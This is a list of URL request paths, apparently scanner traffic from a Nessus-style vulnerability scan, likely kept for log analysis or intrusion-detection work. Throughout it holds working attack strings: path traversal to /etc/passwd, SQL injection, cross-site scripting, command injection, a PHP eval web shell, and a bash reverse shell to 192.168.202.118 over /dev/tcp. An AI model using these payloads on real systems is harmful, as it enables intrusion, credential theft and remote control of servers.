+/microsoft windows html help control cross-zone scripting vulnerability/
+/scripts/direct.php?rf=/etc/passwd\x00
+/help.php?q='&rm\x09q78257168\x09#
+/cgi-bin/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1332009307,416096840 -- 
+/javascript/build.exe
+/main.php?stuff="ping,-w,7000,-n,1,1.2.3.4&rem,
+/cacti/a1stats/a1disp3.cgi?/../../../../../../etc/passwd
+/cote' content/
+/main.php?stuff="rm q82735586&rem 
+/cgi-bin/admin/plog-admin-functions.php?config[basedir]=/etc/passwd\x00
+/panelitprof'l/
+/examples/servlets/servlet/index.php?cid='
+/shopper.cgi?newpage=../../../../../../etc/passwd
+/javascript/mix.exe
+/pfdispaly.cgi?../../../../../../etc/passwd
+/php/php.exe?c:\winnt\win.ini
+/ht8pn8uq.jsp?<script>cross_site_scripting.nasl</script>
+/javascript/commerce.exe
+/p043snfr.fts?<img src="javascript:alert(cross_site_scripting.nasl);">
+/javascript/csv.exe
+/session/login.php?dest=nessus"><script>alert('ossim_dest_xss.nasl')</script><!-- 
+/scripts/rest/api/2/serverinfo
+/ny1b3qq4.html?<script>cross_site_scripting.nasl</script>
+/vjbrrppi.cfm?<script>cross_site_scripting.nasl</script>
+/examples/jsp/jsp2/jspx/modules.php?mod=fm&file=../../../../../../../../../../etc/passwd\x00&bn=fm_d1
+/examples/jsp/jsp2/jspx/zpanel.php?page=/etc/passwd\x00
+/eei78ore.html?<img src="javascript:alert(cross_site_scripting.nasl);">
+/scripts/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331919009','5'--
+/<meta http-equiv=set-cookie content="testbgqj=6434">
+/examples/jsp/checkbox/scp.dll/sendto?template=../../../../../../../../../../../../boot.ini\x00gwextranet_template_dir_traversal.nasl
+/simplebashscripttosetupdevelopmentenvironment/
+/cacti/www/delivery/ac.php?bannerid=-1331909226+or+1=1+--+';passthru(base64_decode($_server[http_nessus_3mwq6imw]));die;/*
+/main.php?logout="&ping\xa0-w\xa011000\xa0-n\xa01\xa04.3.2.1&rem\xa0
+/sysuser/docmgr/edit.stm?name=<script>alert(document.cookie)</script>
+/officescan/cgi/cgichkmasterpwd.exe
+/examples/servlets/servlet/main.php?g2_view=zipcart.download&g2_file=../../../../../../../../../../../../etc/passwd
+/en-us/account/index.php?src=1&_common=1&time=1331905227&action=show_view&module=calendarmodule&view=../../../../../../../../../../etc/passwd\x00
+/xoops232b/htdocs/xoops_lib/modules/protector/onupdate.php?mydirname=a(){}system('/./tmp/sdlffngmto0+>+/dev/null+&'); function v
+/j4drbkil.nsf?<img src="javascript:alert(cross_site_scripting.nasl);">
+/javascript/index2.exe
+/examples/jsp/checkbox?username="<script>foo</script
+/javascript/zencart.exe
+/javascript/support.exe
+/manager/store.php?crn=42'&action=show&show_products_mode=cat_click
+/scripts/sc877q2pzqne.cgi
+/scripts/qcvjnagy16kc.pl
+/m4kkjf8l.cfc?<meta http-equiv=set-cookie content="testyglc=8988">
+/bxnyrhmh.kspx?<meta http-equiv=set-cookie content="testmjct=1867">
+/ap58k3ci.pl?<script>cross_site_scripting.nasl</script>
+/um7xpn15.cgi?<meta http-equiv=set-cookie content="testotoy=6142">
+/g8nu2yy7.php3?<img src="javascript:alert(cross_site_scripting.nasl);">
+/zv8tv7h8.asp?<script>document.cookie="testcqwz=9752;"</script>
+/cgi-perl/sawmill?rfcf+"sawmillinfo/sawmillpassword"+spbn+1,1,21,1,1,1,1,1,1,1,1,1+3
+/main.php?logout=;del\x09q14218261\x09#
+/examples/jsp/jsp2/jspxsearch-results.dot?search_query=nessus"><script>alert('dotcms_search_query_xss.nasl')</script>/
+/javascript/1.exe
+/awstats/awstats.pl?migrate=|echo;/bin/echo -en "vj\0001j\0002\0211\0341j\0001jfx\0133\0315\0200\0222" >> /tmp/qcywjpzuja0;echo|awstats654145.txt
+/examples/jsp/cal/ikonboard.cgi?act=st&f=1&t=1&hl=nessus&st='
+/javascript/log4net.exe
+/smg_smxcfg30.exe?vcc=3560121183d3
+/twiki/bin/view/main/twikiusers?rev=75401 `0<&66-;exec 66<>/dev/tcp/192.168.202.118/26121;sh <&66 >&66 2>&66`#
+/top.php?stuff="ver&rem\x09
+/cal_week.php?op=week&catview=999'
+/jscript/
+/8x6w469u.fts?<meta http-equiv=set-cookie content="testgfjr=1286">
+/top.php?stuff="\x0ddel\x09q29585118\x09#
+/um7xpn15.do?<meta http-equiv=set-cookie content="testotoy=6142">
+/top.php?stuff='\x0auname\x09#
+/scripts/webboard/generate.cgi
+/ewc3rz1l.fts?<script>document.cookie="testkgqo=204;"</script>
+<script>document.cookie="testblcp=8120;"</script>
+/fa8p8lr8.jsp?<img src="javascript:alert(cross_site_scripting.nasl);">
+/index.php?msgs=<script>alert(414575596937)</script>
+/top.php?stuff=ping;-w;8000;-n;1;1.2.3.4&rem;
+/javascript/tmp.exe
+/examples/servlets/servlet/blog.cgi?submit=viewfile&month=01&year=2004&file=|cat /etc/passwd|
+/en-us/account/plugins/safehtml/htmlsax3.php?dir[plugins]=/etc/passwd\x00
+/recordings/cgi/tseekdir.cgi?location=/etc/passwd\x00
+/<?php eval($_post['q71722863']);?>
+/javascript/catalyst.exe
+/help.php?q="&ping,-w,8000,-n,1,1.2.3.4&rem,
+/examples/servlets/servlet/news/index.dot?id=../../../../../../../../../../../..//etc/passwd\x00.jpg
+/javascript/.passwd.java
+/main.php?frm_daynight=day&frm_passwd=q74166941&frm_referer=http%3a//192.168.23.202/&frm_user=&scr_height=&scr_width=
+/prescription-vicodin/
+/iktok2bw.html?<script>cross_site_scripting.nasl</script>
+/0u75ldxq.cfc?<script>cross_site_scripting.nasl</script>
+/s7qus4g3.pl?<script>cross_site_scripting.nasl</script>
+/7dbjwpw6.php?<script>cross_site_scripting.nasl</script>
+/1r8cfrlf.dll?<meta http-equiv=set-cookie content="testydan=5106">
+/main.php?stuff="ping -w 7000 -n 1 1.2.3.4&rem 
+/h5sc3gxy.cgi?<img src="javascript:alert(cross_site_scripting.nasl);">
+/examples/jsp/jsp2/el/wikka.php?wakka=homepage/../../actions/wikkachanges
+/examples/jsp/jsp2/el/nucleus/libs/pluginadmin.php?globals[dir_libs]=/etc/passwd\x00
+/ygkjkngd.fts?<script>document.cookie="testnago=4518;"</script>
+/w4996nr0.x?<meta http-equiv=set-cookie content="testttvs=7163">
+/en-us/esmozg5d.mscgi?<script>cross_site_scripting.nasl</script>
+/0rufe52p.cgi?<img src="javascript:alert(cross_site_scripting.nasl);">
+/ap58k3ci.html?<script>cross_site_scripting.nasl</script>
+/replicas.exe
+/recordings/welcome.php?custom_welcome_page=/etc/passwd\x00
+/subscription-agreement/
+/main.php?stuff=\x0auname\x09>q55874964\x09#
+/scripts/ikonboard.cgi?act=st&f=1&t=1&hl=nessus&st='
+/tukodz3j.idc?<img src="javascript:alert(cross_site_scripting.nasl);">
+/javascript/proc.exe
+/1qwv2p5p.fts?<script>document.cookie="testvqcy=252;"</script>
+/eei78ore.htm?<img src="javascript:alert(cross_site_scripting.nasl);">
+/top.php?stuff="del q83491369 #
+/include/scripts/export_batch.inc.php?dir=http://192.168.202.96:8080/4dckqcc0acprbz?
+/recordings/index.php?show=/etc/passwd
+/officescan/console/remoteinstallcgi/cgiremoteinstall.exe
+/cgi-bin/download.php?language=/etc/passwd\x00
+/bl8sefdm.aspx?<script>cross_site_scripting.nasl</script>
+/javascript/paypal.exe
+/bc van 't hul/
+/help.php?q='\x0auname >q61886362 #
+/scripts/..%5c..%5cwinnt/system32/cmd.exe?/c+dir
+/m2fpztty.idc?<img src="javascript:alert(cross_site_scripting.nasl);">
+/examples/jsp/cal/core/editor.php?editor_insert_bottom=/etc/passwd
+/examples/jsp/sessions/inc/exif.inc.php?exif_prog=(echo -n 'original_exif_prog_cmd_exec.nasl: ';id)||echo
+/phpwebsite/index.php?module=pagemaster&page_user_op=view_page&page_id=10\"><script>alert('vulnerable')</script>&mmn_position=[x:x]
+/top.php?stuff="&ping -w 8000 -n 1 1.2.3.4&rem 
+/main.php?frm_daynight=day&frm_passwd=&frm_referer=http%3a//192.168.23.202/main.php%3fstuff%3d2040844887&frm_user=&scr_height=&scr_width=q77188379
+/scripts/nquser.php
+/<script>document.cookie="testtpby=7052;"</script>
+/iktok2bw.jsp?<img src="javascript:alert(cross_site_scripting.nasl);">
+/cgis/cgi-test.exe
+/cacti/index.php?user_langue=../../../../../../../../../../etc/passwd
+/rpxyx07v.php?<meta http-equiv=set-cookie content="testbnli=1975">
+/base_local_rules.php?dir=<script>alert('base_local_rules_xss.nasl-1331908709')</script>
+/?<meta http-equiv=set-cookie content="testwtbo=4831">
+/cgi.cgi/webbbs/webbbs_config.pl?body=aaaaffff&email=test@example.com&followup=10;cat /etc/passwd&name=joe
+/manager/themes/program/themesettings.inc.php?themesdir=/etc/passwd\x00
+/examples/jsp/error/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331904454,472430861 -- 
+/j4rdyhw8.aspx?<script>document.cookie="testrluj=1420;"</script>
+/cgi-bin/plog-download.php?dl_type=album&checked[]=' union select 'plogger_checked_sql_injection.nasl',0,0,0,0,0,0,0,0,0,0,0,0,0,0 -- 
+/static//..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cetc/passwd
+/javascript/dummy.exe
+/examples/jsp/jsp2/jspx/rot13sj.cgi?/etc/passwd
+/um7xpn15.html?<meta http-equiv=set-cookie content="testotoy=6142">
+/..\pixfir~1\how_to_login.html
+/src/read_body.php?mailbox=<script>alert(vulnerable)</script>&passed_id=<script>alert(vulnerable)</script>&startmessage=1&show_more=0
+/cgi-bin/phf?qalias=x\x0a/bin/cat /etc/passwd
+/scripts/acp/index.php
+/help.php?q="|ping\x0b-w\x0b10000\x0b-n\x0b1\x0b4.3.2.1|rem\x0b
+/javascript/products.exe
+/help.php?q="\x0adel q51358327 #
+/b4vng02k.nsf?<meta http-equiv=set-cookie content="testtrlh=3672">
+/recordings/print.php?what=article&id='
+/javascript/init.exe
+/health-prescription/
+/ny1b3qq4.aspx?<img src="javascript:alert(cross_site_scripting.nasl);">
+/valentine's-day/
+/entrylevelmedicaltranscriptionjobs/
+/scripts/calendar.php?month=' union select 1,1,'1331904225','calendarix_month_sql_injection.nasl',1 #
+/33y9gcqq.do?<meta http-equiv=set-cookie content="testnvxc=4301">
+/scripts/tinfo.php?id=1331909289
+/n1afe1y6.cfc?<img src="javascript:alert(cross_site_scripting.nasl);">
+/wwwping/index.stm?wwwsite=<script>alert(document.cookie)</script>
+/b1q8bywu.do?<img src="javascript:alert(cross_site_scripting.nasl);">
+/eg2u8pbv.cfc?<img src="javascript:alert(cross_site_scripting.nasl);">
+/examples/jsp/cal/?"><script>alert('struts_sa_surl_xss.nasl')</script>
+/examples/jsp/jsp2/el/protection.php?action=logout&siteurl=/etc/passwd
+/en-us/account/index.php?id='union/**/select/**/0,0,1431582502,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
+/scripts/..%5c..%5cwinnt/system32/cmd.exe?/c+ver
+/d5a5renl.php?<img src="javascript:alert(cross_site_scripting.nasl);">
+/forum1_professionnel.asp?n=1771&amp;nn=/../../../../../../../../etc/passwd&amp;page=1
+/cacti/store.php?crn=42'&action=show&show_products_mode=cat_click
+/javascript/.passwd.tar.gz
+/examples/jsp/cal/modules.php?mod=fm&file=../../../../../../../../../../etc/passwd\x00&bn=fm_d1
+/ny1b3qq4.htm?<img src="javascript:alert(cross_site_scripting.nasl);">
+/javascript/recorded.exe
+/phonehome_script.exe
+/qhvu0pdg.aspx?<script>document.cookie="testchuc=2100;"</script>
